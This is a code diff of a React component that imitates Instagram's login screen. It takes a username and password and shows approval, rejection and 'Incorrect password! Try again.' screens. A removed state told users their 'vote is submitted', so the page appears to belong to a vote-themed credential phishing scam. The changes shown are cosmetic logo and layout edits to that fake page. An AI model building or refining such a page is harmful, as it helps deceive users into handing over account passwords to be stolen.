@@ -1,11 +1,10 @@
-import { useEffect, useState } from "react";
+import { useState } from "react";
 import instagramLogo from "../assets/instagram-logo.png";
 export default function InstagramLogin() {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
 
-  const [pending, setPending] = useState(false);
   const [approved, setApproved] = useState(false);
   const [rejected, setRejected] = useState(false);
 
@@ -52,9 +51,7 @@ async function handleLogin(e) {
       <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-6 py-10">
         <div className="w-full max-w-[340px] rounded-[38px] bg-white border border-gray-200 px-6 pt-8 pb-10 text-center shadow-[0_25px_60px_rgba(15,23,42,0.12)]">
           <p className="text-sm text-slate-500 mb-8">English (UK)</p>
-          <div className="mx-auto mb-8 h-14 w-14 rounded-full bg-gradient-to-br from-pink-500 via-purple-500 to-orange-500 flex items-center justify-center text-white text-2xl">
-            <img src={instagramLogo} alt="Instagram Logo" className="h-10 w-10 object-contain" />
-          </div>
+          <img src={instagramLogo} alt="Instagram Logo" className="mx-auto mb-8 h-16 w-16 object-contain" />
           <h1 className="text-2xl font-bold text-slate-900">Incorrect password!</h1>
           <p className="mt-3 text-slate-500">Try again.</p>
         </div>
@@ -62,29 +59,13 @@ async function handleLogin(e) {
     );
   }
 
-  if (pending) {
-    return (
-      <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-6 py-10">
-        <div className="w-full max-w-[340px] rounded-[38px] bg-white border border-gray-200 px-6 pt-8 pb-10 text-center shadow-[0_25px_60px_rgba(15,23,42,0.12)]">
-          <p className="text-sm text-slate-500 mb-8">English (UK)</p>
-          <div className="mx-auto mb-8 h-14 w-14 rounded-full bg-gradient-to-br from-pink-500 via-purple-500 to-orange-500 flex items-center justify-center text-white text-2xl">
-            <img src={instagramLogo} alt="Instagram Logo" className="h-10 w-10 object-contain" />
-          </div>
-          <h1 className="text-2xl font-bold text-slate-900">Pending Approval</h1>
-          <p className="mt-3 text-slate-500">Please wait while your vote is submitted.</p>
-        </div>
-      </div>
-    );
-  }
 
   return (
     <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-6 py-10">
       <div className="w-full max-w-[340px] rounded-[38px] bg-white border border-gray-200 px-6 pt-8 pb-10 shadow-[0_25px_60px_rgba(15,23,42,0.12)]">
         <p className="text-center text-sm text-slate-500 mb-8">English (UK)</p>
 
-        <div className="mx-auto mb-8 h-14 w-14 rounded-full bg-gradient-to-br from-pink-500 via-purple-500 to-orange-500 flex items-center justify-center">
-          <img src={instagramLogo} alt="Instagram Logo" className="h-8 w-8 object-contain" />
-        </div>
+        <img src={instagramLogo} alt="Instagram Logo" className="mx-auto mb-8 h-16 w-16 object-contain" />
 
         <form onSubmit={handleLogin} className="space-y-4">
           <input
